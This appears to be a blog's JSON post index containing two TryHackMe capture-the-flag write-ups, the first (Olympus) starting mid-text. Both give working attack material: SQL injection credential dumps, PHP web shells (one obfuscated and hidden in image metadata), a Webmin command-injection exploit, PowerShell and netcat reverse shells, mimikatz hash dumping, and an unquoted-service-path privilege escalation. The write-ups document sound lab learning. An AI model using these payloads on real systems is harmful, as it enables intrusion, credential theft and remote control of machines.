\"search=%27+union+select+1%2C2%2Cgroup_concat%28randsalt%2Cuser_email%2Cuser_firstname%2Cuser_id%2Cuser_image%2Cuser_lastname%2Cuser_name%2Cuser_password%2Cuser_role%29%2C4%2C5%2C6%2C7%2C8%2C9%2C10+from+users--+-&amp;submit=\"After some editing:Email: prometheus@olympus.thmUsermane: prometheus Password: [ REDACTED ] Role: UserEmail: root@chat.olympus.thmUsername: rootpassword: [ REDACTED ]Role: AdminEmail: zeus@chat.olympus.thmUsername: zeusPassword: [ REDACTED ] Role: UserCracking the HashCracking the root users password to login somewhere would be great.After some time cracking with hashcat, the password for prometheus cracks!The password for Prometheus is [ REDACTED ].CMS Admin PageUsing these credentials, I’m able to login. I’ve also checked the other usernames with this password on both the web app and SSH to see if there is any password reuse. The web app is the only access I have with these credentials so far.After some exploring I find a place to upload a file on the Profile page, when adding a post, and when adding a user.I refer back to the searchsploits and see that there is an Authenticated Arbitrary File Upload vulnerability that might be exploitable.The exploit takes advantage of a vulnerability in the user add file upload. Here is a snippet of the malicious request that will upload the payload exe.phpPOST /admin/users.php?source=add_user HTTP/1.1...Content-Disposition: form-data; name=\"user_image\"; filename=\"exp.php\"Content-Type: application/octet-stream&lt;?php if(isset($_REQUEST['cmd'])){ echo \"&lt;pre&gt;\"; $cmd = ($_REQUEST['cmd']); system($cmd); echo \"&lt;/pre&gt;\"; die; }?&gt;...Unfortunately, the directory where this file is upload is forbidden to me and I won’t be able to execute it like this.Perhaps I could keep trying with the file upload, but for now I will move on and keep looking.ChatThe emails have ‘chat’ in them and I recall a chats database from the SQLi.' union select 1,2,group_concat(column_name),4,5,6,7,8,9,10 from information_schema.columns where table_schema = database() and table_name ='chats'-- -There are 4 columns in the chats database, now to extract the data.' union select 1,2,group_concat(dt,file,msg,uname),4,5,6,7,8,9,10 from chats-- -URL Encode and then cURLcurl http://olympus.thm/~webmaster/search.php -d \"search=%27%20union%20select%201%2C2%2Cgroup_concat%28dt%2Cfile%2Cmsg%2Cuname%29%2C4%2C5%2C6%2C7%2C8%2C9%2C10%20from%20chats--%20-&amp;submit=\"Date: 2022-04-05File: 47c3210d51761686f3af40a875eeaaea.txtMsg: \tAttached : prometheus_password.txt Uname: prometheus#########################################################################################Date: 2022-04-05Msg: \tThis looks great! I tested an upload and found the upload folder, but it seems the filename got changed somehow because I can't download it back...Uname: prometheus#########################################################################################Date: 2022-04-06Msg:\tI know this is pretty cool. The IT guy used a random file name function to make it harder for attackers to access the uploaded files. He's still working on it.Uname: zeusInteresting, there are a few messages that come up. Maybe the reason I can’t access my payload is because the name of that file has been changed to something random. Even more interesting though, is that the altered filename is being stored right here in the “chats” database. Prometheus uploaded “prometheus_passowrd.txt” and the stored filename is now File: 47c3210d51761686f3af40a875eeaaea.txtSubdomain EnumerationThere must be some kind of chat hidding somewhere on the server. This makes me wonder if there isn’t a subdomain I wasn’t able to find from my enumeration.All of the directories have a 302 Found code.This had me stumped for a while until I read that 302 Found “indicates that a specific URL has been moved temporarily to a new location”, so that would mean a “redirect”. I wasn’t aware that wfuzz could follow redirects with the ‘–follow’ flag. When I added this, I got much better results!There is a chat subdomain I wasn’t able to see earlier! And this subdomain has a completely new login.Password ReuseI was able to login with the credentials I found earlier for Prometheus and now I can see the messages from the database.Now the question is, how can I exploit this? I see there is another upload feature. Are there any other directories or files though? I’ll check with wfuzz.The /uploads/ directory is blank but perhaps files can still be accessed. There was an interesting file in the chats database ‘47c3210d51761686f3af40a875eeaaea.txt’ that I had been looking for. Its been found in the /uploads/ directory!The file is a troll but it still tells me that files are accessible in this directory. If I upload my payload into the chat, maybe I can access it from the uploads directory.The payload is uploaded.Now to check if its accessible.Looks like its not found.That’s because the filename has changed. Since I was able to see the changed filename from Prometheus in the chats database, I wonder if I can see mine?I’ll make another SQLi request to look at the files form the chats database and hopefully my filename will be revealed.curl http://olympus.thm/~webmaster/search.php -d \"search=' union select 1,2,group_concat(file),4,5,6,7,8,9,10 from chats-- -&amp;submit=\"As luck would have it, the filenames are revealed!!47c3210d51761686f3af40a875eeaaea.txta545ef4a9457cf3e0ed501f96e5e84ae.php2e223cadedbac19f7c7cbc5c6ccbc7c5.php5b51185314184bc90eeaaeb337ec1a7a.phpb33a114994a77a6035912e252e348b71.phpI uploaded quite a few payloads as tests. They should all provide command execution!Command ExecutionPost-ExploitationI uploaded a full reverse shell and followed the same steps to discover the filename. I started a netcat listener on my attack machine and executed the payload.It looks like zeus and root are the only two users on this machine.Through some exploring I found a config.php file with some database credentials.While looking at SUID binaries, I discovered something that looked unusual, but didn’t have an entry on GTFO bins.find / -perm -u=s -type f 2&gt;/dev/nullEverything here is pretty standard and useless, but the ‘cputils’ binary seems out-of-place.I decided to type ‘cputils’ into the command line and see what happens.It asks me for a source file. It would be nice to have the id_rsa for zeus, so I think I’ll give it that and see what happens.I put the path to the id_rsa file in the source file and a /tmp/id_rsa as the destination.This is great! It copied the id_rsa for zeus. I’ll copy it to my machine and try to login via ssh.The id_rsa file is encrypted with a passphrase. Hopefully john the ripper can crack it!Awesome, the passphrase is revealed.Privilege EscalationI’ll try logging in as zeus over ssh again.This time its a success and I’m logged in as Zeus.One of the first things I want to try to do is use the ‘cputils’ binary to copy /etc/passwd and rewrite it with my own root user, then copy it back to replace the original.I should have known this would fail.There is a snap directory that is owned by zeus.Perhaps this is a lead on privilege escalation. There is a known exploit for snap but I wasn’t able to find any PoC code.I’ve started looking for other files owned by zeus as well as files in the zeus groupfind / -user zeus 2&gt;/dev/null find / -group zeus 2&gt;/dev/nullNone of these writable files have any association with root.A lot of the same files are returned, but a few new files show up in an interesting looking directory./var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc/After exploring this directory, there is an odd PHP file VIGQFQFMYOST.php with a password located at the top.I wonder if I can navigate to this file and see what it does.http://10.10.122.150/0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.phpIts asking for password, so I’ll give it the one I found at the top of the file.BackdoorA backdoor?I guess I’ll give this a shot and start a netcat listener.After starting the netcat listener and filling in the parameters in the URL, it asks for the password again.After submitting, I get a reverse shell as root!!!This shell isn’t good, so I’ll change the root password and login over ssh.The root flag is easily found.There is a note stating that Prometheus has hidden another flag. So I’ll start looking for that. I want to find files with a string matching the “flag{}” format. I took to google to find a command that might do that and came across this LinkThe command is grep -Ril \"flag{\" / 2&gt;/dev/null and it will recursively scan every file looking for strings that match. However, this took entirely way too long and I needed a hint for where to look. After getting a hint I was able to easily find the bonus flag." }, { "title": "Wreath Network", "url": "/posts/Wreath-Network-Write-up/", "categories": "TryHackMe, WriteUp", "tags": "TryHackMe, WriteUp, Wreath", "date": "2022-07-09 17:00:00 +0000", "snippet": "The Wreath Network can be found hereExecutive SummaryThe penetration test was performed at the request of the client, Thomas Wreath. The client provided details of the network prior to the test. There are three machines on the network, one of which is public facing. There is a self-hosted git server and a PC with an antivirus installed.Out-of-date software resulted in the immediate rooting of two out of the three computers. Insecure code in an image upload resulted in gaining access to the third computer.Attack NarrativeProduction Server (.200)The first target IP was given by the client.NmapThe first scan creates a list of open ports on the target machine.nmap -p 1-15000 -iL IP -oN enum/all -vvv --openThere are responses from ports 22, 80, 443, and 10000.The next step is to enumerate the services and their versions.nmap -p 22,80,443,10000 -sC -sV -vvv -iL IP -oN enum/scanThe results of the scan with some information omitted:22/tcp open ssh syn-ack OpenSSH 8.0 (protocol 2.0)80/tcp open http syn-ack Apache httpd 2.4.37 ((centos)OpenSSL/1.1.1c)|_http-title: Did not follow redirect tohttps://thomaswreath.thm\"&gt;&lt;strong&gt;https://thomaswreath.thm|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c443/tcp open ssl/http syn-ack Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)|_http-title: Thomas Wreath | Developer| ssl-cert: Subject:commonName=thomaswreath.thm organizationName=Thomas|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c10000/tcp open http syn-ack MiniServ 1.890 (Webmin httpd)There is a redirect attempt tohttps://thomaswreath.thm, so, thehostname “thomaswreath.thm” was added to the /etc/hosts file tomap the IP address to this hostname.CVE-2019-15107Investigating known exploits for each of these services, it wasdiscovered that MiniServ 1.890 is vulnerable to a command injectionvulnerability:CVE-2019-15107Exploit proof-of-concept code in python is found here(Credits to foxsin32 for sharing their PoC)Post-ExploitationThe exploit takes advantage of a bad check of the ‘pam’ parameter toexecute commands as root.def exploit(target, port, url, command):header = 'Referer: )payload = 'user=gotroot&amp;amp;pam=&amp;amp;expired=2|echo \"\";{}'.format(command)os.system(\"curl -k {} -d '{}' -H '{}'\".format(url,payload,header))‘pam’ is left blank.Using this functionality, the private SSH key can be found in/root/.ssh/id_rsaThe private key provides access to the production server as root viaSSH.Post-EnumerationThe next step is to search for other hosts on the network that are only reachable by the production server. Downloading a static binary of Nmap onto the host by starting a simple python server on the attack machine in the directory with the static binary and using the curl command to fetch the file from the compromised host won’t be a problem because the /tmp directory doesn’t write to disk.Once the static binary is marked as executable, a simple Nmap scan withthe –sn flag will determine which hosts are alive on the network.The hosts at .250 and .1 are both out of scope and .200 is thecompromised machine currently being worked from, so that leaves .150and .100 to further enumerate for services. The two IP addresses areplaced into a file and are imported in Nmap with the –iL flag.There is no response from .100, but .150 has a few ports open. Port 80will be manually inspected; however, a proxy is needed in order toaccess the webpage.Command and Control with EmpireSince the plan is to compromise another host on the network, it will bebeneficial to get a C2 (command and control) server setup. I have chosenthe PowerShell Empire and will be jumping between Empire, SSH, andevil-winrm to accomplish tasks.First the PowerShell Empire server must be started.Then connect to the server with the PowerShell Empire client.Two listeners are created but only one will be used for now,HTTP-L15t3Nr. The other listener will be used later for a jump server.Next, I will need a bash stager to connect to the C2, which will get anagent started on the target. The agent will remain on the target as areverse shell. The stager I use is the multi/bash stager and I setits listener to HTTP-L15t3Nr. Then I execute the stager, and apayload is given. This payload will be copied and pasted into our SSHsession, and an agent will spawn a shell.Pivoting via SSHuttleSince our attack machine isn’t permitted to access the internal network,I will need to pivot using the compromised production server to accessthe next webpage. This can be achieved using a tool called SSHuttle.sshuttle -r root@10.200.73.200 --ssh-cmd \"ssh -i id_rsa\" 10.200.73.0/24 -x 10.200.73.200With this command I set the remote flag with –r and specify the rootuser at the target IP address, then I use the –ssh-cmd flag toinclude (-i) the id_rsa file, the final field sets the network beingproxied to and to not include the remote targets address with –x.We can now type in the .150 target IP address into the browser and visitthe webpage.GitStack Server (.150)Manual InspectionThe first thing I see is a 404 page with some directory information.Upon visiting the /registration/login page, I get a login page with anote about default credentials. Trying these credentials results innothing.ExploitationWe do, however, get a service called GitStack. Using searchsploitresults in a few known exploits for GitStack. After examining each ofthese exploits it is the exploit for 2.3.10 that I will try.This exploit requires a bit of modification in order to get it workingthe way I want.First set the targets IP addresses to the variable ‘ip’Then adjust the filename that the payload will be called.This exploit will create a backdoor to execute remote commands and laterit will be used to trigger a full reverse shell on the target machine.This uploads the backdoor to the target and triggers the ‘whoami’command. I can see that I am NT AUTHORITY\\SYSTEM, which is likehaving root on a Linux machine, but on Windows.With the backdoor uploaded, I can send a post request to the maliciousfile from now on and place whatever payload I like into the ‘a=’parameter.FirewallNow to elevate to a full reverse shell. First, I must determine if thetarget machine is able to connect back to the attack machine through theproduction server. While I can establish a connection to the web pagethrough SSHuttle on port 22, I likely won’t be able to get a reverseshell without punching a hole in the firewall.To check, I will send a ping command to the attack machine from thecompromised target and listen for ICMP requests using TCPdump.Each of the ICMP requests failed and TCPdump didn’t receive anything.This means I will have to open a port in the firewall on the productionserver in order to get a connection between the GitServer and the attackmachine.Jump Server and Hop ListenerUnfortunately, that is not enough to get the reverse shell if I want touse Empire. Empire agents can’t be proxied, so I must also set up a“jump” server on the production server. This jump server will listen forthe GitServers stager I’m about to send and forward its traffic to alocal HTTP_Hop listener in empire. The hop listener will then redirecttraffic to the main http listener.First, I created the Hop_ListenerThen specify the Host as the Production Server IP address. I set thePort to the port I just opened on the Production Server, 23598.Then I set the RedirectListener to the main listener,HTTP-L15t3Nr.Executing this listener writes some files into the /tmp/http_hopfolder on the attack machine. This entire directory will be sent over tothe Production Server in the /tmp/http_hop folder. With these filesin place, I will start the PHP server by running this command in thehttp_hop folder.php –S 0.0.0.0:23597 &amp;\\&gt;/dev/null &amp;Launcher StagerWith the listener listening and the jump server started, I can create aPowerShell launcher that connects to the jump server and then to the C2.I’m using the multi/launcher stager here and setting theListener to be http_hop.Preparing for TransportExecuting the launcher stager generates a PowerShell script. This scriptwill be prepared for transport by URL encoding it.Sending the PayloadWith the payload now URL encoded, I send it using the post requestmethod with curl.Now I have got a new agent in the C2 to do further enumeration on.Since I’m still learning how to effectively use Empire, I’ll also get aclassic reverse shell with netcat by sending the following payload afterits URL encoded. This will require a static binary of netcat on theProduction Server to catch the reverse shell. Once I have the staticbinary on the server, I start the listener and send the payload:powershell.exe -c \"$client = New-Object System.Net.Sockets.TCPClient('IP',PORT);$stream = $client.GetStream();\\[byte\\[\\]\\]$bytes = 0..65535\\|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2\\&gt;&amp;1 \\| Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '\\&gt; ';$sendbyte = (\\[text.encoding\\]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"Post-ExploitationDue to having access to the GitServer as NT AUTHORITY\\SYSTEM, there isno need to escalate privileges.From the earlier port scan, 3389 and 5985 are also open. 3389 isused to enable users to access remote computers and 5985 is the defaultport for Windows Remote Management. I find evil-winrm to be easier andmore stable than a simple netcat shell, so I will need to create a newaccount in the Administrators group since I don’t have credentials.In an interactive shell through netcat, the command to add a user is:net user l15t3nr l15t3nr /addThen the new user must be added to the Administrators and “RemoteManagement Users” groupsnet localgroup Administrators l15t3nr /addnet localgroup “Remote Management Users” l15t3nr /addNow I can connect to a remote management shell with evil-winrmevil-winrm –u l15t3nr –p l15t3nr -i 10.200.73.150Next, I’ll be connecting with RDP to get an interactive GUI session andsharing the resource to mimikatz in order to use the tool.xfreerdp /v:10.200.73.150 /u:l15t3nr /p:l15t3nr +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,shareRunning the following command in an administrative command prompt willstart mimikatz.\\\\tsclient\\share\\mimikatz\\x64\\mimikatz.exeNext, I give myself debug privileges and elevate the integrity to SYSTEMlevel.Now, I will dump all the SAM local password hashes:With the Administrator hash I can pass-the-hash using evil-winrm andlogin as the administrator.Post-EnumerationSince I’m not completely concerned with OPSEC safe tools, I’m going touse the powershell/situational_awareness/network/portscan module inEmpire to enumerate the host that didn’t respond to the ProductionServer; .100. This tool does write to disk, so it could be detectedby AV/EDR if that’s running on the system. If you’re reading this andyou know of a better way to enumerate ports without touching disk ortriggering AV/EDR, please let me know on Twitter @L15t3Nr.The Hosts are set to the IP address and the ports are left default.The Agent is set to the GitServer’s agent. Executing the moduleinitiates the PowerShell script and it returns some interestinginformation.Ports 80 and 3389 are open.PivotingLike before, accessing the webpage on port 80 won’t be possible fromthe attack machine without setting up another proxy or relay andpunching a hole through the GitServer’s firewall. One option forthis is using Chisel to establish a client/server relationshipbetween the attack machine and the GitServer, enabling access to thefinal node in the network.I open port 23600 on the GitServer.Fetching a static binary of Chisel is simple enough. Evil-winrm has aconvenient upload feature that allows me to upload tools to thetarget.I start the chisel server on port 23600 set port 9090 as the proxy port.The chisel client connects to the server on port 23600 and uses the proxy port of 9090. I’m using foxyproxy in my browser to navigate to the remote webpage.Wreath PC (.100)RepositoryThe website is a clone of the Gitserver’s webpage and it’s running php7.4.11The GitStack directory is worth exploring since it has more detailsabout the backend.There’s an interesting git directory that I’ll download and inspectlocally.CommitsThe directory is a repository, so I will rename it as ‘.git’ to beable to interact with it using GitTools.GitTools will help me extract information from the repository, so I willclone it with:Git clone https://github.com/internetwache/GitToolsNow, I’ll run the GitTools extractor in the same directory as ‘.git’ andit creates a new directory called Website.This directory contains commits and identifying the order of thesecommits will help me pinpoint the most recent commit in hopes that itwill uncover a bleeding edge feature on the website which could bevulnerable.Each commit has a ‘commit-meta.txt’ that I can use to get the order. Ienter the ‘Website’ directory and cat out each of thecommit-meta.txt files in each directory.The first commit is easy to find as it has no parent commit andcorresponds to ‘0-’. The next commit in order is ‘2-’ as it has a parentcommit of ‘0-’, and finally ‘1-’ is the most recent commit as it has aparent commit of ‘2-’.The commit order is: 70dde80cc19ec76704567996738894828f4ee895 (‘0-’) 82dfc97bec0d7582d485d9031c09abcb5c6b18f2 (‘2-’) 345ac8b236064b431fa43f53d91c98c4834ef8f3 (‘1-’) File UploadWithin the ‘1-’ directory is the most up-to-date version of the website,and it happens to contain an upload feature in ‘resources/index.php’I can’t access the resources without valid credentials. This is wherethe hash for Thomas obtained from mimikatz came in handy. I was able toguess the password using hashcat.Logging in with thomas : I&lt;3ruby is a success and I get access to theresource.Filter BypassThe purpose of bypassing these checks it so I can upload a malicious phpfile even though the program expects an image.Assessing the source code reveals a few things of note. The parameterbeing used here is ‘file’. When a file is uploaded, there is a checkfor whether the file extension exists in a list of valid extensions.There is another check for whether the variable $size contains False.$size =getimagesize($_FILES[\"file\"][\"tmp_name\"]);if(!in_array(explode(\".\",$_FILES[\"file\"][\"name\"])[1], $goodExts) || !$size){header(\"location: ./?msg=Fail\");The first check for valid extensions has a vulnerability. They are onlychecking if the extension at index 1 is valid, any extensions thereaftercan be whatever I want.The program splits the strings of the filename into a list around theperiod ‘.’Example:Filename.jpg –&gt; [‘Filename’,’jpg’]Then it checks if the item at index 1 is valid by comparing it to a listof valid extensions. By appending a php extension to the end of thefilename, we can upload a php file that passes as an image file.Example:Filename.jpg.php –&gt; [‘Filename’,’jpg’,’php’]The item at index 1 is still valid and the php extension specifies wehave php for the server to execute. The server will ignore the imagedata when it comes time to execute the file and will find the payload asvalid php!The second check uses the ‘getimagesize’ function to determine if thereare valid dimensions encoded in the exifdata. This can be bypassed bysimply using a legitimate image.Another important piece is where the files are stored once they’ve beensuccessfully uploaded. The $target variable indicates it will be the‘uploads/’ directory.$target = \"uploads/\".basename($_FILES[\"file\"][\"name\"]);...move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], $target);Proof-of-ConceptTo ensure the encoded dimensions are valid, it will be best to use alegitimate photo for the payload, append ‘.php’ extension after thephoto extension, and then inject a malicious comment into the imagesexif data to test if the php will run.The filename will look something like cat-L15t3Nr.jpg.phpThe payload:&lt;?php $cmd = $_GET[\"wreath\"]; if(isset($cmd)){ echo \"&lt;pre&gt;\" . shell_exec($cmd) . \"&lt;/pre&gt;\"; } die();?&gt;This payload creates a parameter to inject commands into the underlyinghost machine, which is a PC. The commands are executed by theshell_exec() function. It is known that this machine will have anAnti-Virus, so to be slightly less obvious I will obfuscate the payload.The obfuscated payload:&lt;?php $k0=$\\_GET\\[base64_decode('d3JlYXRo')\\];if(isset($k0)){echo base64_decode('PHByZT4=').shell_exec($k0).base64_decode('PC9wcmU+');}die();?&gt;Now, to inject this payload into an image file:exiftool -Comment=\"\\&lt;?php \\\\$k0=\\\\$\\_GET [base64_decode('d3JlYXRo')\\];if(isset(\\\\$k0)){echo base64_decode('PHByZT4=').shell_exec(\\\\$k0).base64_decode('PC9wcmU+');}die();?\\&gt;\" cat-L15t3Nr.jpg.php -vThe image file looks the same, except now there is a malicious commentin the meta data that will run when its executed.Now, it’s time to upload the malicious image file. The file uploadssuccessfully.After navigating to the uploaded file athttp://10.200.81.100/resources/uploads/cat-L15t3Nr.jpg.php?wreath=systeminfoI get the following response:Which proves the exploit is a success! Now for a reverse shell.Reverse ShellI want to upload a static binary of netcat that is compiled for windowssystems. In order to do that, I’ll need to curl the binary from my localmachine to the remote machine by spinning up a simple python server.Once I have netcat on the machine, I can trigger a connection to mymachine to get a reverse shell.I first created a new directory for myself in the temp directory. Then Iuploaded the netcat binary and outputted it to my directory. Then Ichecked the directory to make sure it uploaded.With netcat uploaded, I can use it to connect back to my local machinefor a reverse shell.I’ll first start a netcat listener on my local machine. Then I’ll sendthe following in the wreath parameter:powershell.exe c:\\\\\\Windows\\\\\\Temp\\\\\\L15t3Nr\\\\\\nc.exe 10.50.82.91 1337 –e cmd.exeThe command was successful, and I got a reverse shell!Post-EnumerationI’m currently authenticated as Thomas, which simply will not do asThomas does not have all the permissions.A few commands I’ve run include:whoami /groupswhoami /privThe ‘SeImpersonatePrivilege’ sounds interesting. It allows me to“impersonate a client after authentication”I’ll also look at the Windows services and hopefully find something userinstalled.Non-default services check:wmic service get name,displayname,pathname,startmode | findstr /v /i “C:\\Windows”There is a vulnerability known as an “Unquoted Service Path” attack,which could lead to a privilege escalation given that the path containsspaces, are writable, and running as NT AUTHORITY\\SYSTEM.The service that stands out is the System Explorer Service, since itspath does not have quotes around it, and it contains spaces. If thisservice is running as NT AUTHORITY\\SYSTEM and the directory is writable,then it might give privilege escalation.To check who the service is running as:sc qc SystemExplorerHelpServiceThe service is running as local system.Now to check if the directory is writable.powershell “get-acl –Path ‘C:\\Program Files (x86)\\System Explorer’ | format-list”The access is given to those in the Users group, so I can write to thispath!Privilege EscalationA wrapper.cs program will be created to execute netcat.using System; using System.Diagnostics; namespace Wrapper{     class Program{         Static void Main(){             Process proc = new Process();             ProcessStartInfo procInfo = new ProcessStartInfo(“C:\\\\Windows\\\\temp\\\\L15t3nr\\\\nc.exe”, “10.50.82.91 443 -e cmd.exe”);              procInfo.CreateNoWindow = true;             proc.StartInfo = procInfo;             proc.Start();              }     } }Then the wrapper.cs file is compiled with mcs:msc Wrapper.csA writable directory is located at C:\\Program Files (x86)\\SystemExplorer\\ and my wrapper program will be named System.exe in thisdirectory to be executed when the service restarts.With the System.exe file in place, and a netcat listening, the servicecan be restarted with:sc stop SystemExplorerHelpServiceAnd thensc start SystemExplorerHelpServiceNow I have obtained all the privileges on all the machines 😊ClosingDoing this network and write-up has been very beneficial to my learning.The write-up especially has solidified the information from thisnetwork. This is an incredible TryHackMe network created byMuirlandOracle. Feel free to reach out! @L15t3Nr" } ]
